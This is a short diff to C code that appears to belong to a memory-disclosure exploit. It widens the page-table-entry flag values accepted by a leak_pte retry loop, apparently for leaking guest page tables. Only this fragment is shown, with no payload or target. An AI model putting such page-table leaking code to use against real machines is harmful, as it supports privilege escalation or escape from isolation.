@@ -389,7 +389,7 @@ retry_gpte:
 	pte_t gpte = leak_pte(base, pte_pa);
 	if (verbose == 1) { fprintf(stderr, "            \\ gpte %10lx", gpte); fflush(stdout); }
 	if (verbose >= 2) dump(gpte);
-	if (!((gpte & 0xfff) == 0x063 || (gpte & 0xfff) == 0x825 || (gpte & 0xfff) == 0x805 || (gpte & 0xfff) == 0x867)) {
+	if (!((gpte & 0xfff) == 0x063 || (gpte & 0xfff) == 0x825 || (gpte & 0xfff) == 0x805 || (gpte & 0xfff) == 0x845 || (gpte & 0xfff) == 0x867)) {
 		if (verbose == 1) fprintf(stderr, "\n");
 		if (verbose >= 2) fprintf(stderr, "\ngpte looks malformed... toto retry_gpte\n");
 		goto retry_gpte;
